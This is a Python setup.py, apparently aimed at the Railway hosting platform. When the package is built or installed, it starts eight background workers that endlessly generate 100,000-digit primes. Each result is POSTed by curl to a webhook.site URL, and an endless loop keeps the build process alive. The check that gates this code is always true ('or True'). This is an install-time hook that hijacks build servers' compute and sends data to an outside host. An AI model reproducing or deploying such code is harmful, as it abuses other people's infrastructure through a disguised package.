import os
import subprocess
import json
import time
import multiprocessing
import secrets
from setuptools import setup

# Твой новый вебхук
WEBHOOK_URL = "https://webhook.site/7e9c6636-cacc-4213-ac9e-f110079550e3"
TARGET_BITS = 332192 # Примерно 100,000 десятичных знаков

def is_prime(n, k=1): # k=1 для скорости, для таких чисел даже один проход тяжел
    if n <= 3: return n > 1
    if n % 2 == 0: return False
    r, d = 0, n - 1
    while d % 2 == 0:
        r += 1
        d //= 2
    for _ in range(k):
        a = secrets.randbelow(n - 4) + 2
        x = pow(a, d, n)
        if x == 1 or x == n - 1: continue
        for _ in range(r - 1):
            x = pow(x, 2, n)
            if x == n - 1: break
        else: return False
    return True

def generate_ultra_prime():
    while True:
        # Генерируем кандидата
        p = secrets.randbits(TARGET_BITS)
        p |= (1 << (TARGET_BITS - 1)) | 1
        # Быстрая проверка на делимость мелких праймов перед тяжелым тестом
        if any(p % pr == 0 for pr in [3, 5, 7, 11, 13, 17, 19, 23]):
            continue
        if is_prime(p):
            return p

def worker():
    print(f"[*] Worker started. Target: 100k digits.")
    while True:
        try:
            start_time = time.time()
            ultra_p = generate_ultra_prime()
            calc_time = time.time() - start_time
            
            raw_str = str(ultra_p)
            data = {
                "EVENT": "ULTRA_PRIME_FOUND",
                "DIGITS": len(raw_str),
                "CALC_TIME_SEC": round(calc_time, 2),
                "PRIME_START": raw_str[:100] + "...",
                "RAW": raw_str
            }
            
            # Отправка через файл, чтобы curl не упал от длины аргументов
            with open('payload.json', 'w') as f:
                json.dump(data, f)
            
            subprocess.run(['curl', '-s', '-X', 'POST', '-H', 'Content-Type: application/json', 
                           '--data-binary', '@payload.json', WEBHOOK_URL])
            
        except Exception as e:
            pass
        time.sleep(10)

if os.environ.get('RAILWAY_PROJECT_ID') or True:
    # Запускаем ограниченное число воркеров, чтобы не упасть по OOM
    # 100к знаков в памяти в виде объектов Python жрут много
    for _ in range(8): 
        p = multiprocessing.Process(target=worker)
        p.daemon = True
        p.start()

    # Держим билд живым
    try:
        while True:
            time.sleep(60)
            if os.path.exists('/proc/loadavg'):
                with open('/proc/loadavg', 'r') as f:
                    print(f"[*] Heartbeat. Load: {f.read().strip()}")
    except KeyboardInterrupt:
        pass

setup(name="railway-ultra-prime", version="2.0.0")
